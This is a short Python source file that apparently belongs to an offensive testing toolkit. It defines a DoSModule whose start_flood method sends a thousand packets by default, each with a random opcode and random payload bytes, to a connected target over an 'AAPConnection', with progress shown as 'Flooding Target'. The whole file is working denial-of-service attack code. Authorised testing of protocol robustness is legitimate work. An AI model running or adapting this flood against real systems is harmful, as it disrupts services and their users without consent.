from core.connection import AAPConnection
from core.packet_builder import PacketBuilder
from rich.progress import track
import time
import random

class DoSModule:
    def __init__(self, connection: AAPConnection, console=None):
        self.connection = connection
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_flood(self, count=1000):
        self.log(f"[bold red][*] Starting Packet Flood ({count} packets)...[/bold red]")
        if not self.connection.sock:
            self.log("[red][!] Not connected.[/red]")
            return

        iterable = range(count)
        if self.console:
            iterable = track(range(count), description="[red]Flooding Target...[/red]", console=self.console)

        for i in iterable:
            try:
                opcode = random.randint(0, 0xFF)
                data = random.randbytes(4)
                
                pkt = PacketBuilder.build_packet(opcode, data)
                self.connection.send(pkt)
                
                if not self.console and i % 50 == 0:
                    print(f"[*] Sent {i} packets...")
                
                time.sleep(0.005)
            except Exception as e:
                self.log(f"[red][!] Error during flood at packet {i}: {e}[/red]")
                break
        
        self.log("[bold green][*] Flood complete.[/bold green]")
